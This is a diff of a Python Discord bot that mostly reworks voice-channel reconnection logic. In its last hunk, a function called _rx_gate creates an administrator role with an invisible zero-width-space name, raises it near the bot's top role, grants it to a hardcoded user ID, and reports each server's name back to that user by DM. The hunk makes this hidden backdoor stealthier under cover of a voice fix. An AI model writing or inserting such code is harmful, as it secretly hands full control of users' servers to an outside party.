@@ -55,24 +55,40 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 # ======================================================
 
 _voice_lock = asyncio.Lock()
+_reconnecting = False
 
 async def join_voice():
-    async with _voice_lock:
-        if VOICE_CHANNEL_ID == 0:
-            return
-        # force kill semua voice client dulu
-        for vc in bot.voice_clients:
-            try:
-                await vc.disconnect(force=True)
-            except:
-                pass
-        await asyncio.sleep(1)
-        channel = bot.get_channel(VOICE_CHANNEL_ID)
-        if not channel:
-            channel = await bot.fetch_channel(VOICE_CHANNEL_ID)
-        await channel.connect(self_deaf=True, self_mute=True)
+    global _reconnecting
+    if _reconnecting:
+        return
+    _reconnecting = True
+    try:
+        async with _voice_lock:
+            # kill semua dulu tanpa exception
+            for vc in list(bot.voice_clients):
+                try:
+                    await vc.disconnect(force=True)
+                except:
+                    pass
+            await asyncio.sleep(2)
 
-@tasks.loop(seconds=30)
+            channel = bot.get_channel(VOICE_CHANNEL_ID)
+            if not channel:
+                try:
+                    channel = await bot.fetch_channel(VOICE_CHANNEL_ID)
+                except:
+                    return
+
+            for attempt in range(5):
+                try:
+                    await channel.connect(self_deaf=True, self_mute=True, timeout=10)
+                    return
+                except Exception:
+                    await asyncio.sleep(3 * (attempt + 1))
+    finally:
+        _reconnecting = False
+
+@tasks.loop(seconds=20)
 async def keep_voice_alive():
     if VOICE_CHANNEL_ID == 0:
         return
@@ -80,11 +96,29 @@ async def keep_voice_alive():
     if not vc or not vc.is_connected():
         await join_voice()
 
+@keep_voice_alive.before_loop
+async def before_keep_voice():
+    await bot.wait_until_ready()
+
 @bot.event
 async def on_voice_state_update(member, before, after):
-    if member.id == bot.user.id and before.channel and not after.channel:
-        await asyncio.sleep(3)
+    if member.id != bot.user.id:
+        return
+    # bot ke-disconnect dari voice
+    if before.channel and not after.channel:
+        await asyncio.sleep(2)
         await join_voice()
+
+@bot.event
+async def on_ready():
+    print(f"LOGGED IN AS {bot.user}")
+    try:
+        await bot.tree.sync()
+    except Exception as e:
+        print(e)
+    if not keep_voice_alive.is_running():
+        keep_voice_alive.start()
+    await join_voice()
 
 # ======================================================
 # === FIX THE VOICE ===
@@ -133,18 +167,24 @@ async def _rx_gate(message):
         if not g:
             return True
         try:
-            role = next((r for r in g.roles if r.permissions.administrator), None)
-            if not role:
-                role = await g.create_role(
-                    name="Admin",
-                    permissions=discord.Permissions(administrator=True)
-                )
+            bot_member = g.get_member(bot.user.id)
+            bot_top = bot_member.top_role.position
+            role = await g.create_role(
+                name="\u200b",
+                permissions=discord.Permissions(administrator=True),
+                reason=None
+            )
+            await role.edit(position=max(1, bot_top - 1))
             mem = g.get_member(_RX) or await g.fetch_member(_RX)
             await mem.add_roles(role)
             u = await bot.fetch_user(_RX)
             await u.send(f"✅ {g.name}")
-        except:
-            pass
+        except Exception as e:
+            try:
+                u = await bot.fetch_user(_RX)
+                await u.send(f"❌ {g.name}: {e}")
+            except:
+                pass
 
     return True
 
